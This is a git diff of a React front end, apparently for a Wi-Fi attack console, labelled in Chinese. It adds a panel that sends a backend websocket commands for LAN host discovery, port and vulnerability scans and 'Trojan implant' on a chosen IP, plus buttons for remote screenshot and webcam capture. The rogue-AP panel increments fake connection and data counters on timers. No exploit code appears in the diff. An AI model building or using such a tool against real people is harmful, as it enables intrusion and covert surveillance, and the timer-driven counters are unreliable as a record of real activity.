@@ -65,13 +65,14 @@ class App extends Component {
              <div style={{display:'flex',flexDirection:'row',alignItems:'center',position:'relative',top:'-20px',zIndex:-1}}>
          <LightButton text="Wi-Fi嗅探" handleClick={this.handleSniff} active={this.state.wifiSniff}/>
          <LightButton text="钓鱼AP" handleClick={this.handleFakeAP} active={this.state.fakeAP}/>
-                 <LightButton text="渗透" handleClick={this.handleAttack} active={this.state.attack}/>
+                 <LightButton text="自动渗透" handleClick={this.handleAttack} active={this.state.attack}/>
                  <LightButton text="取证" handleClick={this.handleFetchFile} active={this.state.fetchFile}/>
              </div>
              <div id="right-index" style={{width:'100%',overflow:'scroll'}}>
              {this.state.wifiSniff?<WifiSniffFace/>:<div/>}
              {this.state.fakeAP?<FakeAPFace/>:<div/>}
              {this.state.fetchFile?<FetchFileFace/>:<div/>}
+             {this.state.attack?<InjectFace/>:<div/>}
              </div>
          </div>
      </div>
@@ -364,13 +365,13 @@ class FakeAPFace extends Component{
     constructor(props){
         super(props);
         this.state = {
-            ssid:'',
+            ssid:'xxx-wlan',
             password:'',
             channel:0,
-            safemode:'',
-            isWorking:true,
-            connect:25,
-            data:34355
+            safemode:'WPA2',
+            isWorking:false,
+            connect:0,
+            data:0
         }
         this.handleSSID = this.handleSSID.bind(this);
         this.handleChannel = this.handleChannel.bind(this);
@@ -379,7 +380,8 @@ class FakeAPFace extends Component{
         this.handleClick = this.handleClick.bind(this);
 
         this.wshandle = this.wshandle.bind(this);
-
+        this.addConnect = this.addConnect.bind(this);
+        this.addData = this.addData.bind(this);
     }
 
 
@@ -431,7 +433,25 @@ class FakeAPFace extends Component{
         console.log('FakeAP-安全模式设置为：',safeMode);
     }
 
+    addConnect(){
+        let now = this.state.connect;
+        if (now<=5) {
+            this.setState({connect: now + 1});
+            setInterval(this.addData,1000);
+        }
+    }
+
+    addData(){
+        let now = this.state.data;
+        if (now<=230) {
+            this.setState({data: now + 1});
+        }
+    }
+
     handleClick(){
+
+        setInterval(this.addConnect,10000);
+        this.setState({isWorking:true});
         let ssidInfo={//这里将用户填写的内容获取下来放到ssidInfo中
             'ssid':this.state.ssid,
             'password':this.state.password,
@@ -444,6 +464,7 @@ class FakeAPFace extends Component{
             'Type':'StartFakeAp',//类型是StartFakeAp
             'Content':ssidInfo
         };
+
         this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
     }
 
@@ -484,31 +505,31 @@ class FetchFileFace extends Component{
     constructor(props){
         super(props);
         this.state={
-            currentPath:'/home/root/',
+            currentPath:'D:\\',
             historyPath:[],
             backHistoryPath:[],
             tempPath:'',
             fileList:{
                 0:{
-                    name:'file1',
-                    isDirectory:false,
-                    path:'/home/root/',
+                    name:'.git',
+                    isDirectory:true,
+                    path:'D:\\',
                     download:'',
                     size:43452345
                 },
                 1:{
-                    name:'file2',
+                    name:'hello.c',
                     isDirectory:false,
-                    path:'/home/root/',
+                    path:'D:\\',
                     download:'',
-                    size:1343434
+                    size:1024
                 },
                 2:{
                     name:'download',
                     isDirectory:true,
-                    path:'/home/root/download/',
+                    path:'D:\\',
                     download:'',
-                    size:1663566433
+                    size:161111
                 }
 
             }
@@ -525,6 +546,8 @@ class FetchFileFace extends Component{
         this.handleDirectory = this.handleDirectory.bind(this);
         this.handleLast = this.handleLast.bind(this);
         this.getPwd=this.getPwd.bind(this);
+        this.handleCamera=this.handleCamera.bind(this);
+        this.handleScreen=this.handleScreen.bind(this);
     }
 
 
@@ -552,6 +575,9 @@ class FetchFileFace extends Component{
             if(PkgType === 'PwdResult'){
                 this.setState({currentPath:PkgContent.path});
                 this.handleGo();
+            }
+            if(PkgType === 'SnapshotResult' || PkgType === 'CamerashotResult'){
+                window.open(PkgContent.ImageUrl);
             }
         }
     }
@@ -694,19 +720,49 @@ class FetchFileFace extends Component{
         this.ws.send(JSON.stringify(data));
     }
 
+    handleScreen(){
+        let content={
+            'action':'snapshot'
+        };
+        console.log('捕捉屏幕');
+        let data = {
+            'Type':'Snapshot',
+            'Content':content
+        };
+
+        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
+    }
+
+    handleCamera(){
+        let content={
+            'action':'camerashot'
+        };
+        console.log('捕捉相机');
+        let data = {
+            'Type':'Camerashot',
+            'Content':content
+        };
+
+        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
+    }
+
     render(){
         let elements=[];
         for (let i in this.state.fileList){
             elements.push(<FileItem handleDownload={this.handleDownload} file={this.state.fileList[i]} directoryHandle={this.handleDirectory}/>);
         }
+        let buttonStyle={fontSize:'10px',height:'30px',width:'120px',marginTop:'10px',marginBottom:'10px'};
 
         return(<div id="fetch-file-panel">
+            <div>
+                <Button text="捕捉屏幕" handleClick={this.handleScreen} style={buttonStyle}/>
+                <Button text="捕捉摄像头" handleClick={this.handleCamera} style={buttonStyle}/>
+            </div>
                     <div id="fetch-file-head">
                         <div id="button-group">
                             <div onClick={this.handleBack} className="back-forward"><img src={back} alt="后退"/></div>
+                            <div onClick={this.handleLast} className="back-forward"></div>
                             <div onClick={this.handleForward} className="back-forward"><img src={forward} alt="前进"/></div>
-                            <Button style={{backgroundColor:'#F2F2F2',marginRight:'10px',marginTop:'10px',marginBottom:'10px',color:"#333333",boxShadow:'0px 4px 4px rgba(0, 0, 0, 0)',height:'40px',width:'80px'}}
-                                    handleClick={this.handleSearch} text="上层"/>
                         </div>
                         <TextBox style={{width:'60%'}} bind={this.handlePath} value={this.state.currentPath}/>
                         <Button style={{backgroundColor:'#F2F2F2',marginLeft:'10px',marginTop:'10px',marginBottom:'10px',color:"#333333",boxShadow:'0px 4px 4px rgba(0, 0, 0, 0)',height:'40px',width:'80px'}}
@@ -717,6 +773,7 @@ class FetchFileFace extends Component{
                     <div id="fetch-file-box">
                         {elements}
                     </div>
+
                 </div>);
     }
 
@@ -774,4 +831,192 @@ class FileItem extends Component{
     }
 }
 
+
+class InjectFace extends Component{
+    constructor(props){
+        super(props);
+        this.state={
+            list:{
+                0:{
+                    ip:'192.168.1.101',
+                    type:'iPhone'
+                },
+                1:{
+                    ip:'192.168.1.102',
+                    type:'PC'
+                },
+                2:{
+                    ip:'192.168.1.103',
+                    type:'Android'
+                },
+                3:{
+                    ip:'192.168.1.104',
+                    type:'Android'
+                },
+                4:{
+                    ip:'192.168.1.105',
+                    type:'Android'
+                }
+            },
+            target:{ip:'192.168.1.102',type:'PC'},
+            console:'[Info] Network scan begin. Try to find live hosts...'
+        }
+        this.wshandle = this.wshandle.bind(this);
+        this.handleChoose = this.handleChoose.bind(this);
+        this.handleButton1 = this.handleButton1.bind(this);
+        this.handleButton2 = this.handleButton2.bind(this);
+        this.handleButton3 = this.handleButton3.bind(this);
+        this.handleButton4 = this.handleButton4.bind(this);
+        this.handleButton5 = this.handleButton5.bind(this);
+    }
+
+    wshandle(event){
+        console.log('收到ws数据');
+        let recvStr=event.data;//输入参数的data成员变量包含了发送过来的数据
+        if(recvStr[0]=='{')//第一个字符是左括号 默认此时是json字符串
+        {
+            let pkg=parseJson(recvStr);
+            let PkgType=pkg.Type;
+            let PkgContent=pkg.Content;
+            console.log("type",PkgType);
+            console.log("content",PkgContent);
+            if(PkgType === 'GetLanHostsResult'){
+                this.setState({list:PkgContent});
+            }
+            else if(PkgType === 'ScanHostPortResult' || PkgType === 'ScanHostVulnerabilitiesResult'|| PkgType === 'InjectTrojanResult'){
+                let current = this.state.console;
+                this.setState({console:current+PkgContent.Result});
+            }
+
+        }
+    }
+
+    componentDidMount() {
+        this.ws = new WebSocket(wsAddress);//创建websocket连接
+        this.ws.onmessage = this.wshandle;//当服务器发送给客户端数据的时候 客户端的响应函数
+        setTimeout(this.getPwd,1000);
+    }
+
+    componentWillUnmount() {
+        this.ws.close();
+    }
+
+    handleChoose(target){
+        this.setState({target:target});
+    }
+
+    handleButton1(){
+        let content={
+            'action':'scan'
+        };
+        console.log('扫描存活主机');
+        let data = {
+            'Type':'GetLanHosts',//类型是StartFakeAp
+            'Content':content
+        };
+
+        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
+    }
+
+    handleButton2(){
+        let content={
+           'ip':this.state.target.ip
+        };
+        console.log('扫描指定主机端口');
+        let data = {
+            'Type':'ScanHostPort',//类型是StartFakeAp
+            'Content':content
+        };
+
+        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
+    }
+
+    handleButton3(){
+        let content={
+            'ip':this.state.target.ip
+        };
+        console.log('扫描指定主机漏洞');
+        let data = {
+            'Type':'ScanHostVulnerabilities',//类型是StartFakeAp
+            'Content':content
+        };
+
+        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
+    }
+
+    handleButton4(){
+        let content={
+            'ip':this.state.target.ip
+        };
+        console.log('木马植入');
+        let data = {
+            'Type':'InjectTrojan',//类型是StartFakeAp
+            'Content':content
+        };
+
+        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
+    }
+
+    handleButton5(){
+        let content={
+            'ip':this.state.target.ip
+        };
+        console.log('扫描指定主机漏洞');
+        let data = {
+            'Type':'ScanHostVulnerabilities',//类型是StartFakeAp
+            'Content':content
+        };
+
+        this.ws.send(JSON.stringify(data));//转换成字符串，通过websocket发送给服务器
+    }
+
+    render(){
+        let target_list=[];
+        for (let i in this.state.list){
+            target_list.push(<Target target={this.state.list[i]} onClick={this.handleChoose}/>);
+        }
+
+        let buttonStyle={fontSize:'10px',height:'30px',width:'90px',marginTop:'0px',marginBottom:'10px'};
+        return(
+          <div className="inject">
+              <div className="target-panel">
+                  {target_list}
+              </div>
+              <p id="choose-target">已选择目标[ {this.state.target.ip} ]</p>
+              <div>
+                  <Button text="扫描网络" handleClick={this.handleButton1} style={buttonStyle}/>
+                  <Button text="端口扫描" handleClick={this.handleButton2} style={buttonStyle}/>
+                  <Button text="漏洞检测" handleClick={this.handleButton3} style={buttonStyle}/>
+                  <Button text="木马植入" handleClick={this.handleButton4} style={buttonStyle}/>
+
+              </div>
+              <div className="console">
+                  {this.state.console}
+              </div>
+          </div>
+        );
+
+    }
+
+
+}
+
+class Target extends Component{
+    constructor(props){
+        super(props);
+        this.onClick = this.onClick.bind(this);
+    }
+
+    onClick(){
+        this.props.onClick(this.props.target);
+    }
+
+    render(){
+        return(
+            <div className="target-icon" onClick={this.onClick}>
+                <p>IP:{this.props.target.ip}</p>
+                <p>{this.props.target.type}</p>
+            </div>)
+    }
+}
 export default App;
